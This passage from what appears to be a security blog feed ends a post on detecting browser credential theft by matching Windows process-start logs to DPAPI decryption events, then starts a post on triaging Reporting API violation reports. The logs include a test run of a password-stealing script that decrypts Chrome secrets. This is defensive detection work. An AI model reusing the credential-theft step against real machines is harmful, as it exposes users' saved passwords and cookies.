Name&amp;equals&quot;TokenElevationType&quot;&gt;&amp;percnt&amp;percnt1938&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ProcessId&quot;&gt;0x16d8&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CommandLine&quot;&gt;&quot;C&amp;colon&amp;bsolProgram Files&amp;bsolGoogle&amp;bsolChrome&amp;bsolApplication&amp;bsolchrome&amp;periodexe&quot; &lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetUserSid&quot;&gt;S-1-0-0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetUserName&quot;&gt;-&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetDomainName&quot;&gt;-&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetLogonId&quot;&gt;0x0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ParentProcessName&quot;&gt;C&amp;colon&amp;bsolWindows&amp;bsolexplorer&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;MandatoryLabel&quot;&gt;S-1-16-8192&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;&amp;NewLine
</div>
<p>The important part here is the
  <strong>NewProcessId</strong>, in hex
  <strong>0x17eac
  </strong>which is
  <strong>97964</strong>.</p>
<p>A 16385 event looks like this:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt;Provider Name&amp;equals&quot;Microsoft-Windows-Crypto-DPAPI&quot; Guid&amp;equals&quot;&amp;lcub...&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;EventID&gt;16385&lt;&amp;solEventID&gt;&amp;NewLine    &lt;Version&gt;0&lt;&amp;solVersion&gt;&amp;NewLine    &lt;Level&gt;4&lt;&amp;solLevel&gt;&amp;NewLine    &lt;Task&gt;64&lt;&amp;solTask&gt;&amp;NewLine    &lt;Opcode&gt;0&lt;&amp;solOpcode&gt;&amp;NewLine    &lt;Keywords&gt;0x2000000000000040&lt;&amp;solKeywords&gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon06&amp;colon42&amp;period1772585Z&quot; &amp;sol&gt;&amp;NewLine    &lt;EventRecordID&gt;826993&lt;&amp;solEventRecordID&gt;&amp;NewLine    &lt;Correlation ActivityID&amp;equals&quot;&amp;lcub777bf68d-7757-0028-b5f6-7b775777da01&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;Execution ProcessID&amp;equals&quot;1392&quot; ThreadID&amp;equals&quot;57108&quot; &amp;sol&gt;&amp;NewLine    &lt;Channel&gt;Microsoft-Windows-Crypto-DPAPI&amp;solDebug&lt;&amp;solChannel&gt;&amp;NewLine    &lt;Computer&gt;WIN-GG82ULGC9GO&amp;periodcontoso&amp;periodlocal&lt;&amp;solComputer&gt;&amp;NewLine    &lt;Security UserID&amp;equals&quot;S-1-5-18&quot; &amp;sol&gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">OperationType</span>&quot;&gt;<span class="highlight">SPCryptUnprotect</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">DataDescription</span>&quot;&gt;<span class="highlight">Google Chrome</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;MasterKeyGUID&quot;&gt;&amp;lcub4df0861b-07ea-49f4-9a09-1d66fd1131c3&amp;rcub&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;Flags&quot;&gt;0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ProtectionFlags&quot;&gt;16&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ReturnValue&quot;&gt;0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessStartKey&quot;&gt;32651097299526713&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">CallerProcessID</span>&quot;&gt;<span class="highlight">97964</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessCreationTime&quot;&gt;133561300019253302&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;PlainTextDataSize&quot;&gt;32&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;&amp;NewLine
</div>
<p>The important parts here are the
  <strong>OperationType</strong>, the
  <strong>DataDescription
  </strong>and the
  <strong>CallerProcessID</strong>.</p>
<p>For DPAPI decrypts, the
  <strong>OperationType
  </strong>will be SPCryptUnprotect.</p>
<p>Each Chromium based browser will tag its data with the product name, e.g. Google Chrome, or Microsoft Edge depending on the owner of the data. This will always appear in the
  <strong>DataDescription
  </strong>field, so it is possible to distinguish browser data from other DPAPI secured data.</p>
<p>Finally, the
  <strong>CallerProcessID
  </strong>will map to the process performing the decryption. In this case, it is 97964 which matches the process ID seen in the 4688 event above, showing that this was likely Google Chrome decrypting its own data! Bear in mind that since these logs only contain the path to the executable, for a full assurance that this is actually Chrome (and not malware pretending to be Chrome, or malware injecting into Chrome), additional protections such as removing administrator access, and application allowlisting could also be used to give a higher assurance of this signal. In recent versions of Chrome or Edge, you might also see logs of decryptions happening in the elevation_service.exe process, which is another legitimate part of the browser's data storage.</p>
<p>To detect unauthorized DPAPI access, you will want to generate a running map of all processes using 4688 events, then look for 16385 events that have a CallerProcessID that does not match a valid caller – Let's try that now.</p>
<p>
  <strong>Testing with a python password stealer</strong>
</p>
<p>We can test that this works with a public script to decrypt passwords taken from
  <a href="https://www.geeksforgeeks.org/how-to-extract-chrome-passwords-in-python/" target="_blank">a public blog</a>. It generates two events, as expected:</p>
<p>Here is the 16385 event, showing that a process is decrypting the "Google Chrome" key.</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;EventID&gt;16385&lt;&amp;solEventID&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon28&amp;colon13&amp;period7891561Z&quot; &amp;sol&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;OperationType&quot;&gt;SPCryptUnprotect&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;DataDescription&quot;&gt;<span class="highlight">Google Chrome</span>&lt;&amp;solData&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessID&quot;&gt;<span class="highlight">68768</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessCreationTime&quot;&gt;133561312936527018&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;PlainTextDataSize&quot;&gt;32&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;
</div>
<p>Since the data description being decrypted was "Google Chrome" we know this is an attempt to read Chrome secrets, but to determine the process behind 68768 (0x10ca0), we need to correlate this with a 4688 event.</p>
<p>Here is the corresponding 4688 event from the Security Log (a process start for python3.exe) with the matching process id:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;EventID&gt;4688&lt;&amp;solEventID&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon28&amp;colon13&amp;period6527871Z&quot; &amp;sol&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;NewProcessId&quot;&gt;<span class="highlight">0x10ca0</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;NewProcessName&quot;&gt;C&amp;colon&amp;bsolpython3&amp;bsolbin&amp;bsolpython3&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TokenElevationType&quot;&gt;&amp;percnt&amp;percnt1938&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ProcessId&quot;&gt;0xca58&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CommandLine&quot;&gt;<span class="highlight">&quot;c&amp;colon&amp;bsolpython3&amp;bsolbin&amp;bsolpython3&amp;periodexe&quot; steal&amp;lowbarpasswords&amp;periodpy</span>&lt;&amp;solData&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ParentProcessName&quot;&gt;C&amp;colon&amp;bsolWindows&amp;bsolSystem32&amp;bsolcmd&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;
</div>
<p>In this case, the process id matches the python3 executable running a potentially malicious script, so we know this is likely very suspicious behavior, and should trigger an alert immediately! Bear in mind process ids on Windows are not unique so you will want to make sure you use the 4688 event with the timestamp closest, but earlier than, the 16385 event.</p>
<p>
  <strong>Summary</strong>
</p>
<p>This blog has described a technique for strong detection of cookie and credential theft. We hope that all defenders find this post useful. Thanks to Microsoft for adding the DPAPIDefInformationEvent log type, without which this would not be possible.</p>
]]></content:encoded>
<pubDate>2024-04-30T12:14:48.193-04:00</pubDate>
</item>
<item>
<title>Uncovering potential threats to your web application by leveraging security reports</title>
<link>http://security.googleblog.com/2024/04/uncovering-potential-threats-to-your.html</link>
<guid>http://security.googleblog.com/2024/04/uncovering-potential-threats-to-your.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Yoshi Yamaguchi, Santiago Díaz, Maud Nalpas,  Eiji Kitamura, DevRel team</span>

<p>
<a href="https://www.w3.org/TR/reporting-1/">The Reporting API</a> is an emerging web standard that provides a generic reporting mechanism for issues occurring on the browsers visiting your production website. The reports you receive detail issues such as security violations or soon-to-be-deprecated APIs, from users’ browsers from all over the world.
</p>
<p>
Collecting reports is often as simple as specifying an endpoint URL in the HTTP header; the browser will automatically start forwarding reports covering the issues you are interested in to those endpoints. However, processing and analyzing these reports is not that simple. For example, you may receive a massive number of reports on your endpoint, and it is possible that not all of them will be helpful in identifying the underlying problem. In such circumstances, distilling and fixing issues can be quite a challenge.
</p>
<p>
In this blog post, we'll share how the Google security team uses the Reporting API to detect potential issues and identify the actual problems causing them. We'll also introduce an open source solution, so you can easily replicate Google's approach to processing reports and acting on them.
</p>
<h1>How does the Reporting API work?</h1>


<p>
Some errors only occur in production, on users’ browsers to which you have no access. You won't see these errors locally or during development because there could be unexpected conditions real users, real networks, and real devices are in. With the <a href="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api">Reporting API</a>, you directly leverage the browser to monitor these errors: the browser catches these errors for you, generates an error report, and sends this report to an endpoint you've specified.
</p>
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-UXHxbjggUXX5XtV3xcXU4QX4FwqrMz8n4Yzvty8W3mCZ8vwSIBchtSvAb74ngaa9XxJ5kWV0AU0IbPD0WsiR1gHyh5ytHLWk5E3HjoKepXSSkvM8e3RCspc-Vox8wfPDaBrD9v0tB5jDriVgyN6lEUEVO_Cm-7Wpd_rIviwysXYwfTwXN1LAVXDE9v0-/s1600/How%20reports%20are%20generated%20and%20sent.png" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-UXHxbjggUXX5XtV3xcXU4QX4FwqrMz8n4Yzvty8W3mCZ8vwSIBchtSvAb74ngaa9XxJ5kWV0AU0IbPD0WsiR1gHyh5ytHLWk5E3HjoKepXSSkvM8e3RCspc-Vox8wfPDaBrD9v0tB5jDriVgyN6lEUEVO_Cm-7Wpd_rIviwysXYwfTwXN1LAVXDE9v0-/s1600/How%20reports%20are%20generated%20and%20sent.png" /></a></div>
<p style="text-align: center;"><i>
How reports are generated and sent.
</i></p>
<p style="text-align: left;">
Errors you can monitor with the Reporting API include:
</p>
<ul>

<li>Security violations: <a href="https://developer.mozilla.org/docs/Web/HTTP/CSP">Content-Security-Policy (CSP)</a>, <a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">Cross-Origin-Opener-Policy (COOP)</a>, <a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Cross-Origin-Embedder-Policy">Cross-Origin-Embedder-Policy (COEP)</a>

</li><li>Deprecated and soon-to-be-deprecated API calls

</li><li>Browser interventions

</li><li>Permissions policy

</li><li>And more 
</li>
</ul>
<p>
For a full list of error types you can monitor, see <a href="https://developer.chrome.com/articles/reporting-api/#use_cases_and_report_types">use cases and report types</a>.
</p>
<p>
The Reporting API is activated and configured using HTTP response headers: you need to declare the endpoint(s) you want the browser to send reports to, and which error types you want to monitor. The browser then sends reports to your endpoint in POST requests whose payload is a list of reports.
</p>
<p>
Example setup:</p><span id="docs-internal-guid-2e7dbd9c-7fff-6711-54c9-a1755c90f135"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>#</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;">&nbsp; </span><span>Example setup to receive CSP</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations reports, Document-Policy</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations reports, and Deprecation reports </span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;">&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>Reporting-Endpoints: main-endpoint="https://reports.example/main", default="</span><a href="https://reports.example/default"><span>https://reports.example/default</span></a><span>"</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span># CSP</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations and Document-Policy</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations will</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>be</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>sent</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>to</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>`main-endpoint`</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>Content-Security-Policy:</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>script-src</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>'self';</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>object-src</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>'none';</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>report-to</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>main-endpoint;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>Document-Policy:</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>document-write=?0;</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>report-to=main-endpoint;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span># Deprecation</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>reports</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>are generated automatically and don't</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>need</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>an</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>explicit</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>endpoint; they're</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>always</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>sent</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>to</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>the</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>`default`</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>endpoint</span></p></span>
<p><b>Note: </b>Some policies support "report-only" mode. This means the policy sends a report, but doesn't actually enforce the restriction. This can help you gauge if the policy is working effectively.</p>
<p>
Chrome users whose browsers generate reports can see them in <a href="https://developer.chrome.com/docs/devtools/javascript/background-services#reporting-api">DevTools in the Application panel</a>:
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy0AC2pelAI7Ug3qhbhHlfYN7MH97_Dp7mM89u3JsIyQQwAZck5GhCZmz_tlF9mtDfMeFwSxbZ63eMuAteeImDz3xwed34fwzzXpYZLIxoPr9e3e6VTmtN9HqTfNtc2bgAHmWhWOP2MEZGZx1TNKWKEcT-by-IAKj62exZCAG6dwIj3yCYhcpAjAcCdgfr/s1600/Example%20of%20viewing%20reports%20in%20the%20Application%20panel%20of%20DevTools.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy0AC2pelAI7Ug3qhbhHlfYN7MH97_Dp7mM89u3JsIyQQwAZck5GhCZmz_tlF9mtDfMeFwSxbZ63eMuAteeImDz3xwed34fwzzXpYZLIxoPr9e3e6VTmtN9HqTfNtc2bgAHmWhWOP2MEZGZx1TNKWKEcT-by-IAKj62exZCAG6dwIj3yCYhcpAjAcCdgfr/s16000/Example%20of%20viewing%20reports%20in%20the%20Application%20panel%20of%20DevTools.png" /></a></div>
<p style="text-align: center;"><i>
Example of viewing reports in the Application panel of DevTools.
</i></p>
<p style="text-align: left;">
You can generate various violations and see how they are received on a server in <a href="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api#demo_and_code">the reporting endpoint demo</a>:
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJTkZ_Nsl1aNEIMnLrONyjUdz8Oy0LYc_AhSmhmt9z5QxRUECbqJf6nQPZV6e0ueDORHlJ739eXJaG8FUwyn04DyGKTQlwkkXYzLCJ0Ow20xbP4K1b-x-MlODmVli-tNkKG8RewYM7x2KvVl1Vvq_RpABJGDmc7yTvb8zN6sl0i65vvBuBzF6OIiNLvPeP/s1600/Example%20violation%20reports.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJTkZ_Nsl1aNEIMnLrONyjUdz8Oy0LYc_AhSmhmt9z5QxRUECbqJf6nQPZV6e0ueDORHlJ739eXJaG8FUwyn04DyGKTQlwkkXYzLCJ0Ow20xbP4K1b-x-MlODmVli-tNkKG8RewYM7x2KvVl1Vvq_RpABJGDmc7yTvb8zN6sl0i65vvBuBzF6OIiNLvPeP/s16000/Example%20violation%20reports.png" /></a></div><p style="text-align: center;"><i>Example violation reports</i></p>
<p style="text-align: left;">
The Reporting API is supported by Chrome, and partially by Safari as of March 2024. For details, see the <a href="https://developer.chrome.com/articles/reporting-api/#browser_support">browser support</a> table.  
</p>
<h1>Google's approach </h1>


<p>
Google benefits from being able to uplift security at scale. Web platform mitigations like <a href="https://developer.mozilla.org/docs/Web/HTTP/CSP">Content Security Policy</a>, <a href="https://developer.mozilla.org/docs/Web/API/Trusted_Types_API">Trusted Types</a>, <a href="https://developer.mozilla.org/docs/Glossary/Fetch_metadata_request_header">Fetch Metadata</a>, and the <a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">Cross-Origin Opener Policy</a> help us engineer away entire classes of vulnerabilities across hundreds of Google products and thousands of individual services, as described in <a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security">this blogpost</a>.
</p>
<p>
One of the engineering challenges of deploying security policies at scale is identifying code locations that are incompatible with new restrictions and that would break if those restrictions were enforced. There is a common 4-step process to solve this problem: 
</p>
<ol>

<li>Roll out policies in <em>report-only mode</em> (<a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only">CSP report-only mode example</a>). This instructs browsers to execute client-side code as usual, but gather information on any events where the policy would be violated if it were enforced. This information is packaged in violation reports that are sent to a reporting endpoint.

</li><li>The violation reports must be triaged to link them to locations in code that are incompatible with the policy. For example, some code bases may be incompatible with security policies because they use a dangerous API or use patterns that mix user data and code.

</li><li>The identified code locations are refactored to make them compatible, for example by using safe versions of dangerous APIs or changing the way user input is mixed with code. These refactorings uplift the security posture of the code base by helping reduce the usage of dangerous coding patterns. 

</li><li>When all code locations have been identified and refactored, the policy can be removed from <em>report-only mode</em> and fully enforced. Note that in a typical roll out, we iterate steps 1 through 3 to ensure that we have triaged all violation reports. 
</li>
</ol>
<p>
With the Reporting API, we have the ability to run this cycle using a unified reporting endpoint and a single schema for several security features. This allows us to gather reports for a variety of features across different browsers, code paths, and types of users in a centralized way.</p>
<p><b>Note: </b>A violation report is generated when an entity is attempting an action that one of your policies forbids. For example, you've set CSP on one of your pages, but the page is trying to load a script that's not allowed by your CSP. Most reports generated via the Reporting API are violation reports, but not all — other types include deprecation reports and crash reports. For details, see <a href="https://developer.chrome.com/articles/reporting-api/#use_cases_and_report_types">Use cases and report types</a>.</p>
<p>
Unfortunately, it is common for noise to creep into streams of violation reports, which can make finding incompatible code locations difficult. For example, many browser extensions, malware, antivirus software, and devtools users inject third-party code into the DOM or use forbidden APIs. If the injected code is incompatible with the policy, this can lead to violation reports that cannot be linked to our code base and are therefore not actionable. This makes triaging reports difficult and makes it hard to be confident that all code locations have been addressed before enforcing new policies.
</p>
<p>
Over the years, Google has developed a number of techniques to collect, digest, and summarize violation reports into <em>root causes</em>.<em> </em>Here is a summary of the most useful techniques we believe developers can use to filter out noise in reported violations:
</p>
<h3 style="text-align: left;">Focus on root causes</h3>


<p>
It is often the case that a piece of code that is incompatible with the policy executes several times throughout the lifetime of a browser tab. Each time this happens, a new violation report is created and queued to be sent to the reporting endpoint. This can quickly lead to a large volume of individual reports, many of which contain redundant information. Because of this, grouping violation reports into clusters enables developers to abstract away individual violations and think in terms of root causes. Root causes are simpler to understand and can speed up the process of identifying useful refactorings. 
</p>
<p>
Let's take a look at an example to understand how violations may be grouped. For instance, a report-only CSP that forbids the use of inline JavaScript event handlers is deployed. Violation reports are created on every instance of those handlers and have the following fields set:
</p>
<ul>

<li>The <code>blockedURL</code> field is set to <code>inline</code>, which describes the type of violation.

</li><li>The <code>scriptSample</code> field is set to the first few bytes of the contents of the event handler in the field. 

</li><li>The <code>documentURL</code> field is set to the URL of the current browser tab. 
</li>
</ul>
<p>
Most of the time, these three fields uniquely identify the inline handlers in a given URL, even if the values of other fields differ. This is common when there are tokens, timestamps, or other random values across page loads. Depending on your application or framework, the values of these fields can differ in subtle ways, so being able to do fuzzy matches on reporting values can go a long way in grouping violations into actionable clusters. In some cases, we can group violations whose URL fields have known prefixes, for example all violations with URLs that start with <code>chrome-extension</code>, <code>moz-extension</code>, or <code>safari-extension</code> can be grouped together to set root causes in browser extensions aside from those in our codebase with a high degree of confidence.
</p>
<p>
Developing your own grouping strategies helps you stay focused on root causes and can significantly reduce the number of violation reports you need to triage. In general, it should always be possible to select fields that uniquely identify interesting types of violations and use those fields to prioritize the most important root causes.
</p>
<h3 style="text-align: left;">Leverage ambient information</h3>


<p>
Another way of distinguishing non-actionable from actionable violation reports is ambient information. This is data that is contained in requests to our reporting endpoint, but that is not included in the violation reports themselves. Ambient information can hint at sources of noise in a client's set up that can help with triage:
</p>
<ul>

<li><strong>User Agent or <a href="https://developer.chrome.com/docs/privacy-security/user-agent-client-hints">User Agent client hints</a>:</strong> User agents are a great tell-tale sign of non-actionable violations. For example, crawlers, bots, and some mobile applications use custom user agents whose behavior differs from well-supported browser engines and that can trigger unique violations. In other cases, some violations may only trigger in a specific browser or be caused by changes in nightly builds or newer versions of browsers. Without user agent information, these violations would be significantly more difficult to investigate. <br />

</li><li><strong>Trusted users: </strong>Browsers will attach any available cookies to requests made to a reporting endpoint by the Reporting API, if the endpoint is same-site with the document where the violation occurs. Capturing cookies is useful for identifying the type of user that caused a violation. Often, the most actionable violations come from trusted users that are not likely to have invasive extensions or malware, like company employees or website administrators. If you are not able to capture authentication information through your reporting endpoint, consider rolling out report-only policies to trusted users first. Doing so allows you to build a baseline of actionable violations before rolling out your policies to the general public.<br />

</li><li><strong>Number of unique users: </strong>As a general principle, users of typical features or code paths should generate roughly the same violations. This allows us to flag violations seen by a small number of users as potentially suspicious, since they suggest that a user's particular setup might be at fault, rather than our application code. One way of 'counting users' is to keep note of the number of unique IP addresses that reported a violation. Approximate counting algorithms are simple to use and can help gather this information without tracking specific IP addresses. For example, the <a href="https://en.wikipedia.org/wiki/HyperLogLog">HyperLogLog</a> algorithm requires just a few bytes to approximate the number of unique elements in a set with a high degree of confidence.
</li>
</ul>
<h3 style="text-align: left;">Map violations to source code (advanced)</h3>


<p>
Some types of violations have a <code>source_file</code> field or equivalent. This field represents the JavaScript file that triggered the violation and is usually accompanied by a line and column number. These three bits of data are a high-quality signal that can point directly to lines of code that need to be refactored. 
</p>
<p>
Nevertheless, it is often the case that source files fetched by browsers are compiled or minimized and don't map directly to your code base. In this case, we recommend you use JavaScript source maps to map line and column numbers between <a href="https://developer.chrome.com/blog/new-in-devtools-104#authored-deployed">deployed and authored files</a>. This allows you to translate directly from violation reports to lines of source code, yielding highly actionable report groups and root causes.
</p>
<h1>Establish your own solution</h1>


<p>
The Reporting API sends browser-side events, such as security violations, deprecated API calls, and browser interventions, to the specified endpoint on a per-event basis. However, as explained in the previous section, to distill the real issues out of those reports, you need a data processing system on your end.
</p>
<p>
Fortunately, there are plenty of options in the industry to set up the required architecture, including open source products. The fundamental pieces of the required system are the following:
</p>
<ul>

<li><strong>API endpoint</strong>: A web server that accepts HTTP requests and handles reports in a JSON format

</li><li><strong>Storage</strong>: A storage server that stores received reports and reports processed by the pipeline

</li><li><strong>Data pipeline</strong>: A pipeline that filters out noise and extracts and aggregates required metadata into constellations

</li><li><strong>Data visualizer</strong>: A tool that provides insights on the processed reports
</li>
</ul>
<p>
Solutions for each of the components listed above are made available by public cloud platforms, SaaS services, and as open source software. See the <a href="?tab=t.0#heading=h.8mq1xpwkxy0y">Alternative solutions</a> section for details, and the following section outlining a sample application.
</p>
<h3 style="text-align: left;">Sample application: Reporting API Processor</h3>


<p>
To help you understand how to receive reports from browsers and how to handle these received reports, we created a <a href="https://github.com/googlecloudplatform/reporting-api-processor">small sample application</a> that demonstrates the following processes that are required for distilling web application security issues from reports sent by browsers:
</p>
<ul>

<li>Report ingestion to the storage

</li><li>Noise reduction and data aggregation

</li><li>Processed report data visualization
</li>
</ul>
<p>
Although this sample is relying on Google Cloud, you can replace each of the components with your preferred technologies. An overview of the sample application is illustrated in the following diagram:
